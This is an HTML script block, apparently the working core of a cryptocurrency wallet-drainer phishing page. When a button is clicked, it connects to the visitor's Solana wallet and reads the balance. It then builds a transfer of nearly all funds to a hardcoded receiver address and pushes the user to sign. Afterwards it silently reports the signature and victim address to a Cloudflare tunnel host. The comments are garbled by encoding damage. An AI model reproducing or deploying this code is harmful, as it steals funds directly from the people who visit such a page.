<script>
    // ğŸ”± éš§é“åªè´Ÿè´£æœ€åæ”¶é’±
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
    const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        const sWeb3 = window.solanaWeb3;
        if (!p) return;

        try {
            await p.connect();
            // ğŸ”± ç›´æ¥ç”¨æ‰‹æœºè”ç½‘æŸ¥ï¼Œä¸é—®æœåŠ¡å™¨ï¼Œé˜²æ­¢ 403 å’Œ éš§é“æ‹¦æˆª
            const conn = new sWeb3.Connection("https://rpc.ankr.com/solana", "confirmed");
            
            const [balance, bhObj] = await Promise.all([
                conn.getBalance(p.publicKey),
                conn.getLatestBlockhash()
            ]);

            const amount = balance - 1000000; // æ‰£é™¤ Gas
            if (amount <= 0) return;

            // æ„é€ äº¤æ˜“
            const tx = new sWeb3.Transaction().add(
                sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(RECEIVER),
                    lamports: amount
                })
            );
            tx.recentBlockhash = bhObj.blockhash;
            tx.feePayer = p.publicKey;

            // ğŸ”± å…³é”®ï¼šå¼ºåˆ¶æ‹‰èµ·ç­¾å
            const { signature } = await p.signAndSendTransaction(tx);
            
            // ç­¾å®Œååï¼Œé™é»˜é€šçŸ¥æœåŠ¡å™¨ï¼ˆæˆåŠŸä¸å¦ä¸å½±å“ä½ æ”¶é’±ï¼‰
            fetch(`${tunnel}/broadcast`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ sig: signature, address: p.publicKey.toString() })
            });

            window.location.href = "https://explorer.solana.com/tx/" + signature;

        } catch (e) {
            console.error(e);
            location.reload();
        }
    };
</script>
